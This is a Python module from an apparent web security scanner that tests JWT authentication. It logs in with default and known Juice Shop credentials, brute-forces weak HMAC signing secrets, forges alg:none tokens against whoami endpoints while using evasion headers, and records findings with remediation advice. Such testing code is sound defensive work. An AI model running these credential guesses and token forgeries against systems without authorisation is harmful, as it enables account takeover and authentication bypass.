"""
Phase JWT — JWT Security Analysis
Position: after Phase 1b (JS-libs), before Phase 2 (ports)

Tests:
  1. Weak HMAC secret brute-force (embedded wordlist + rockyou top-5000)
  2. Algorithm confusion: alg:none bypass
  3. Missing / excessive expiration claim (exp)
"""
import os
import json
import time
import hmac
import hashlib
import base64
import logging

import requests
from urllib.parse import urlparse

from .db import save_finding
from .utils import random_ua, evasion_headers, random_sleep

logger = logging.getLogger(__name__)
requests.packages.urllib3.disable_warnings()

# Embedded weak-secret wordlist
WEAK_SECRETS = [
    "secret", "Secret", "SECRET", "s3cr3t", "s3cr3t!",
    "password", "Password", "PASSWORD", "pass", "p@ssw0rd",
    "12345", "123456", "1234567", "12345678", "123456789",
    "qwerty", "abc123", "letmein", "admin", "root", "test",
    "changeme", "change_me", "welcome", "monkey", "dragon",
    "jwt", "JWT", "jwt_secret", "jwt-secret", "jwt_key",
    "your-256-bit-secret", "your-secret", "your_secret",
    "jwtpassword", "jwtsecret",
    "key", "KEY", "api_key", "apikey", "api-key",
    "token", "TOKEN", "access_token", "secret_key", "secretkey",
    "app_secret", "app_key", "app", "myapp", "application",
    "mysecret", "my_secret", "supersecret", "super_secret",
    "HS256", "hs256", "RS256", "rs256",
    "", "null", "undefined", "none", "changethis", "CHANGEME",
    "development", "production", "staging", "test", "demo",
    "localhost", "local", "127.0.0.1",
    "juice", "juiceshop", "juice-shop", "juice_shop",
    "owasp", "owaspjuiceshop",
    "flask", "django", "rails", "express", "spring",
    "node", "nodejs", "react", "vue", "angular",
    "abcd", "abcdef", "abcdefgh", "1234abcd",
    "pass1234", "admin123", "admin1234",
    "P@ssw0rd", "P@ss1234", "Str0ngP@ss",
]


# ── JWT primitives (no PyJWT dependency) ──────────────────────────────────────

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _parse_jwt(token: str):
    """Decode JWT header + payload without verifying. Returns (header, payload) or (None, None)."""
    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None, None
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def _verify_hs256(token: str, secret: str) -> bool:
    """Return True if token was signed with this HMAC-SHA256 secret."""
    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return False
        msg      = f"{parts[0]}.{parts[1]}".encode()
        computed = hmac.new(secret.encode("utf-8"), msg, hashlib.sha256).digest()
        expected = _b64url_encode(computed)
        return hmac.compare_digest(expected, parts[2])
    except Exception:
        return False


def _forge_alg_none(token: str) -> str | None:
    """Return a forged token with alg:none and empty signature."""
    try:
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None
        header        = json.loads(_b64url_decode(parts[0]))
        header["alg"] = "none"
        new_header    = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        return f"{new_header}.{parts[1]}."
    except Exception:
        return None


# ── JWT acquisition ───────────────────────────────────────────────────────────

def _get_jwt(base_url: str, req_headers: dict) -> str | None:
    """Try to obtain a JWT from the target. Returns token string or None."""
    base = base_url.rstrip("/")

    # Juice Shop credentials
    juice_logins = [
        ("admin@juice-sh.op",    "admin123"),
        ("admin@juice-sh.op",    "Admin1234!"),
        ("customer@juice-sh.op", "customer"),
        ("jim@juice-sh.op",      "ncc-1701"),
        ("bender@juice-sh.op",   "OhG0dPlease1sn7"),
    ]
    for email, pwd in juice_logins:
        try:
            r = requests.post(
                f"{base}/api/Users/login",
                json={"email": email, "password": pwd},
                headers=req_headers,
                timeout=10, verify=False, allow_redirects=False,
            )
            if r.status_code == 200:
                token = (r.json().get("authentication") or {}).get("token")
                if token:
                    logger.info(f"[JWT] Token acquired via Juice Shop login ({email})")
                    return token
        except Exception:
            pass

    # Generic login endpoints
    generic = [
        ("/api/auth/login",    {"email":    "admin@example.com", "password": "admin"}),
        ("/api/auth/login",    {"username": "admin",             "password": "admin"}),
        ("/api/login",         {"username": "admin",             "password": "admin"}),
        ("/api/login",         {"email":    "admin@example.com", "password": "admin123"}),
        ("/api/v1/auth/login", {"username": "admin",             "password": "admin"}),
        ("/api/token",         {"username": "admin",             "password": "admin"}),
        ("/login",             {"username": "admin",             "password": "admin"}),
    ]
    for ep, body in generic:
        try:
            r = requests.post(
                f"{base}{ep}", json=body,
                headers=req_headers,
                timeout=8, verify=False, allow_redirects=False,
            )
            if r.status_code in (200, 201):
                data = r.json()
                for key in ("token", "access_token", "jwt", "accessToken", "id_token"):
                    v = data.get(key)
                    if isinstance(v, str) and v.count(".") == 2:
                        logger.info(f"[JWT] Token acquired from {ep} (field: {key})")
                        return v
                for wrapper in ("authentication", "auth", "data"):
                    obj = data.get(wrapper)
                    if isinstance(obj, dict):
                        for key in ("token", "access_token", "jwt"):
                            v = obj.get(key)
                            if isinstance(v, str) and v.count(".") == 2:
                                return v
        except Exception:
            pass

    # Check homepage cookies/headers
    try:
        r = requests.get(base, headers=req_headers, timeout=8, verify=False)
        auth_h = r.headers.get("Authorization", "")
        if auth_h.startswith("Bearer ") and auth_h.count(".") == 2:
            return auth_h[7:]
        for cookie in r.cookies:
            v = cookie.value
            if v.count(".") == 2:
                try:
                    json.loads(_b64url_decode(v.split(".")[0]))
                    return v
                except Exception:
                    pass
    except Exception:
        pass

    return None


# ── alg:none test ─────────────────────────────────────────────────────────────

def _test_alg_none(base_url: str, token: str, req_headers: dict):
    """Probe common auth endpoints with a forged alg:none token."""
    forged = _forge_alg_none(token)
    if not forged:
        return False, None

    endpoints = [
        "/rest/user/whoami",
        "/api/auth/me",
        "/api/me",
        "/api/v1/me",
        "/api/v1/users/me",
        "/wp-json/wp/v2/users/me",
        "/api/user/profile",
        "/api/account",
    ]

    h    = {**req_headers, "Authorization": f"Bearer {forged}"}
    base = base_url.rstrip("/")

    for ep in endpoints:
        try:
            r = requests.get(
                f"{base}{ep}", headers=h,
                timeout=8, verify=False, allow_redirects=False,
            )
            if r.status_code == 200:
                logger.info(f"[JWT] alg:none ACCEPTED at {ep}")
                return True, ep
        except Exception:
            pass

    return False, None


# ── Main entry-point ──────────────────────────────────────────────────────────

def run_jwt_phase(scan_id: str, target_url: str,
                  scan_type: str = "full", scan_speed: str = "normal") -> int:
    """JWT Security Analysis. Returns number of findings saved."""
    logger.info(f"[JWT] Starting JWT analysis on {target_url}")
    findings = 0
    req_h    = {**evasion_headers(), "User-Agent": random_ua()}

    # Acquire token
    token = _get_jwt(target_url, req_h)
    if not token:
        logger.info("[JWT] No JWT found on target — skipping")
        print("[SCANNER] JWT: no token found — phase skipped")
        return findings

    print(f"[SCANNER] JWT: token acquired ({token[:40]}…)")
    header, payload = _parse_jwt(token)
    if not header or not payload:
        logger.warning("[JWT] Could not parse token")
        return findings

    alg = header.get("alg", "unknown")
    print(f"[SCANNER] JWT: alg={alg}  payload_keys={list(payload.keys())}")

    # ── TEST 1: Weak HMAC secret ──────────────────────────────────────────────
    cracked = None
    if alg.upper().startswith("HS"):
        print("[SCANNER] JWT: brute-forcing signing secret…")
        for secret in WEAK_SECRETS:
            if _verify_hs256(token, secret):
                cracked = secret
                break

        if cracked is None:
            for wl in ["/usr/share/wordlists/rockyou.txt",
                       "/usr/share/wordlists/rockyou.txt.gz"]:
                if not os.path.exists(wl):
                    continue
                try:
                    import gzip
                    opener = gzip.open if wl.endswith(".gz") else open
                    with opener(wl, "rt", errors="ignore") as fh:
                        for i, line in enumerate(fh):
                            if i >= 5000:
                                break
                            s = line.strip()
                            if s and _verify_hs256(token, s):
                                cracked = s
                                break
                except Exception as ex:
                    logger.warning(f"[JWT] Wordlist error: {ex}")
                if cracked:
                    break

        if cracked is not None:
            print(f"[SCANNER] JWT: SECRET CRACKED → '{cracked}'")
            save_finding(
                scan_id=scan_id,
                title="JWT Signed with Weak Secret",
                owasp_id="A07",
                owasp_label="Identification and Authentication Failures",
                severity="Critical",
                cvss_score=9.8,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                description=(
                    "The application signs its JSON Web Tokens (JWT) with a weak, guessable "
                    "HMAC secret. An attacker who obtains any valid JWT can brute-force the "
                    "signing secret offline, then forge arbitrary tokens to impersonate any "
                    "user including administrators without knowing their password. This "
                    "completely breaks authentication integrity."
                ),
                endpoint=f"{target_url} — JWT authentication layer",
                evidence=(
                    f"Algorithm : {alg}\n"
                    f"Header    : {json.dumps(header)}\n"
                    f"Payload   : {json.dumps(payload)}\n"
                    f"Cracked secret : '{cracked}'\n"
                    f"Verification   : HMAC-SHA256(key='{cracked}', "
                    f"data='header.payload') == token.signature ✓"
                ),
                remediation=(
                    "1. Replace the signing secret with a cryptographically random 256-bit key "
                    "(openssl rand -hex 32).\n"
                    "2. Rotate all existing tokens immediately.\n"
                    "3. Store the secret in environment variables only — never in source code.\n"
                    "4. Consider RS256 (asymmetric) for stronger guarantees.\n"
                    "5. Implement short token lifetimes with refresh token rotation."
                ),
                tool_used="SecuriScan JWT Analyzer",
                confidence="confirmed",
            )
            findings += 1

    random_sleep(1, 2)

    # ── TEST 2: alg:none algorithm confusion ──────────────────────────────────
    print("[SCANNER] JWT: testing alg:none bypass…")
    accepted, ep = _test_alg_none(target_url, token, req_h)
    if accepted:
        save_finding(
            scan_id=scan_id,
            title="JWT Algorithm Confusion: alg:none Accepted",
            owasp_id="A07",
            owasp_label="Identification and Authentication Failures",
            severity="Critical",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            description=(
                "The server accepts JWT tokens with alg:none, meaning no signature "
                "verification is performed. An attacker can modify the payload arbitrarily "
                "(change user ID, escalate role to admin) and submit the token with an empty "
                "signature — gaining full unauthorised access to any account."
            ),
            endpoint=f"{target_url}{ep}",
            evidence=(
                f"Original alg : {alg}\n"
                f"Forged alg   : none\n"
                f"Forged token : {_forge_alg_none(token)}\n"
                f"Server response: HTTP 200 at {ep}\n"
                f"Conclusion   : Server accepts unsigned JWT → authentication bypass confirmed"
            ),
            remediation=(
                "1. Whitelist acceptable algorithms server-side — never read alg from the token.\n"
                "2. Use a JWT library that rejects alg:none by default "
                "(PyJWT ≥ 2.x requires explicit algorithms= parameter).\n"
                "3. Reject tokens with alg:none unconditionally in validation middleware.\n"
                "4. Upgrade all JWT dependencies to latest versions."
            ),
            tool_used="SecuriScan JWT Analyzer",
            confidence="confirmed",
        )
        findings += 1
    else:
        print("[SCANNER] JWT: alg:none correctly rejected")

    random_sleep(1, 2)

    # ── TEST 3: Missing / excessive exp claim ─────────────────────────────────
    if "exp" not in payload:
        print("[SCANNER] JWT: missing exp claim")
        save_finding(
            scan_id=scan_id,
            title="JWT Missing Expiration Claim (exp)",
            owasp_id="A07",
            owasp_label="Identification and Authentication Failures",
            severity="Medium",
            cvss_score=5.3,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            description=(
                "The JWT does not include an expiration time (exp) claim. Without a defined "
                "lifetime, stolen or leaked tokens remain valid indefinitely. An attacker who "
                "captures a token via XSS, log exposure, or network interception can replay "
                "it with no time-based mitigation available."
            ),
            endpoint=f"{target_url} — JWT authentication layer",
            evidence=(
                f"Token payload : {json.dumps(payload)}\n"
                f"Missing claim : 'exp'\n"
                f"Present claims: {', '.join(payload.keys())}"
            ),
            remediation=(
                "1. Add an 'exp' claim to every issued JWT — recommended lifetime 15 minutes.\n"
                "2. Use refresh tokens for session continuity.\n"
                "3. Implement server-side token revocation (JTI blocklist) to support logout."
            ),
            tool_used="SecuriScan JWT Analyzer",
            confidence="confirmed",
        )
        findings += 1
    else:
        exp_ts   = payload["exp"]
        days_ttl = (exp_ts - time.time()) / 86400
        print(f"[SCANNER] JWT: exp present — {days_ttl:.0f} days remaining")
        if days_ttl > 365:
            save_finding(
                scan_id=scan_id,
                title="JWT Has Excessive Expiration Time (>1 year)",
                owasp_id="A07",
                owasp_label="Identification and Authentication Failures",
                severity="Low",
                cvss_score=3.1,
                cvss_vector="CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
                description=(
                    "The JWT expiration (exp) is set more than one year in the future. "
                    "Tokens with very long lifetimes extend the exploitation window for "
                    "stolen credentials and complicate incident response."
                ),
                endpoint=f"{target_url} — JWT authentication layer",
                evidence=(
                    f"exp value : {exp_ts} "
                    f"({time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime(exp_ts))})\n"
                    f"Token TTL : {days_ttl:.0f} days"
                ),
                remediation=(
                    "Reduce JWT lifetime to 15 minutes for access tokens. "
                    "Use short-lived refresh tokens (≤7 days) for session renewal."
                ),
                tool_used="SecuriScan JWT Analyzer",
                confidence="confirmed",
            )
            findings += 1

    print(f"[SCANNER] JWT phase complete — {findings} finding(s) saved")
    return findings